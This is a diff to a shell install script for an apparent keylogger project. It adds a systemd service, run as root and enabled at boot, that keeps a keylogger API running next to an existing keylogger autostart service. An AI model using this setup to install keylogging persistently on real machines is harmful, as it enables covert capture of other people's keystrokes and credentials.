@@ -46,6 +46,25 @@ echo "PYTHONPATH='lib/'" >> .env
 echo "Install python dependencies...";
 sudo pipenv sync;
 
+# Config API as service
+echo "Config API as service...";
+echo "
+[Unit]
+Description=Keylogger
+
+[Service]
+RemainAfterExit=yes
+User=root
+WorkingDirectory=${PWD}
+ExecStart=pipenv run uvicorn keylogger_api:app --reload
+
+[Install]
+WantedBy=multi-user.target
+" > keylogger_api.service;
+
+sudo mv keylogger_api.service /etc/systemd/system/;
+sudo systemctl enable --now keylogger_api.service;
+
 # Config autostart
 echo "Config autostart service...";
 echo "
@@ -66,4 +85,5 @@ sudo mv keylogger.service /etc/systemd/system/;
 sudo systemctl enable --now keylogger.service;
 
 echo "Finish";
+echo "check: systemctl status keylogger_api.service";
 echo "check: systemctl status keylogger.service";
